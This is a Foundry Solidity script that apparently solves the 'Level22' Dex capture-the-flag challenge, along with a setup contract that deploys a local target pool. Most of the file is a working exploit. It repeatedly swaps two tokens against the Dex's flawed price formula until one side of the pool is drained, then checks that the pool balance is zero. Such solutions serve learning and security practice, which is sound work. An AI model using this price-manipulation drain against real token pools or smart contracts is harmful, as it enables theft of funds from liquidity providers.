pragma solidity ^0.8.14;

import {Script, console} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {Dex, SwappableToken} from "../src/Level22.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

contract Level22Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress, wallet.addr);
        vm.stopBroadcast();

        require(levelDone(contractAddress), "Solution failed");
    }

    function exploit(address _target, address _attacker) private {
        Dex dex = Dex(_target);
        IERC20 t1 = IERC20(dex.token1());
        IERC20 t2 = IERC20(dex.token2());


        t1.approve(_target, type(uint256).max);
        t2.approve(_target, type(uint256).max);

        while(true) {
            if(t2.balanceOf(_attacker) >= t2.balanceOf(_target)) {
                dex.swap(address(t2), address(t1), t2.balanceOf(_target));
                return;
            }
            dex.swap(address(t2), address(t1), t2.balanceOf(_attacker));

            if(t1.balanceOf(_attacker) >= t1.balanceOf(_target)) {
                dex.swap(address(t1), address(t2), t1.balanceOf(_target));
                return;
            }
            dex.swap(address(t1), address(t2), t1.balanceOf(_attacker));
        }
    }

    function levelDone(address _target) private returns (bool) {
        Dex target = Dex(_target);
        uint256 balance1 = IERC20(target.token1()).balanceOf(address(target));
        uint256 balance2 = IERC20(target.token2()).balanceOf(address(target));
        return balance1 == 0 || balance2 == 0;
    }
}

contract Setup is Script {
    function run() public {
        VmSafe.Wallet memory attacker = vm.createWallet(vm.envUint("PRIVATE_KEY"));
        VmSafe.Wallet memory deployer = vm.createWallet(vm.envUint("PRIVATE_KEY_2"));
        vm.startBroadcast(deployer.privateKey);

        Dex target = new Dex();
        address token1 = address(new SwappableToken(address(target), "T1", "T1", 110));
        address token2 = address(new SwappableToken(address(target), "T2", "T2", 110));
        IERC20(token1).transfer(attacker.addr, 10);
        IERC20(token2).transfer(attacker.addr, 10);

        IERC20(token1).approve(address(target), 100);
        IERC20(token2).approve(address(target), 100);
        target.addLiquidity(token1, 100);
        target.addLiquidity(token2, 100);
        target.setTokens(token1, token2);

        vm.stopBroadcast();

        console.log("Target address:", address(target));
    }
}
